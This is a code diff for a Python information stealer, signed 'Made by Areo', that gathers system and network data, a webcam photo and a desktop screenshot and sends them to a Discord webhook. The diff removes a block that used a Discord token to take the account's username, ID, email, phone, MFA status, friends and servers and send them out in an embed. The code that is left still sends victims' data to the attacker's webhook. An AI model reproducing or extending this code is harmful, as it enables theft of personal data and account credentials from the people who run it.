@@ -1,6 +1,6 @@
 from components import networkinfo, systeminfo, webcam
 from components.discordtoken import DiscordToken
-from components.config import webhook_url, webcamphoto_check, username, discord_token, systemdata_check, networkdata_check
+from components.config import webhook_url, webcamphoto_check, username, systemdata_check, networkdata_check
 from discord import SyncWebhook, Embed, File
 from tkinter import messagebox
 
@@ -18,21 +18,6 @@ def Main():
         system_data = systeminfo.get_information()
     else:
         system_data = ["None", "None", "None", "None", "None", "None"]
-
-    # get discord information
-    if discord_token is True:
-        discord_client = DiscordToken()
-        user = discord_client.get_user()
-        friends = discord_client.get_friends()
-        friends_message = ""
-        for friend in friends:
-            friends_message += friend + ", "
-
-        guilds = discord_client.get_guilds()
-
-        guilds_message = ""
-        for guild in guilds: 
-            guilds_message += guild + ", "
         
 
     # take a screenshot of the desktop
@@ -57,25 +42,6 @@ def Main():
     )
     embed.set_image(url="attachment://screenshot.png")
     embed.set_footer(text="Made by Areo | v1.0.0")
-
-
-    # discord token embed
-    if discord_token is True:
-        discord_embed = Embed(
-            title="**Discord Account Information**",
-            url="https://github.com/areoxy/raeo/",
-            description=f"```Username: {user[0]}\nID: {user[1]}\nEmail: {user[2]}\nPhone: {user[3]}\nMFA: {user[4]}```"
-        )
-        discord_embed.set_footer(text="Made by Areo | v1.0.0")
-        discord_embed.add_field(name="**Friends**",value=friends_message)
-        discord_embed.add_field(name="**Guilds**", value=guilds_message)
-        try:
-            webhook.send(
-                embed=discord_embed,
-                username=username
-            )
-        except:
-            pass
 
     # send discord 
 
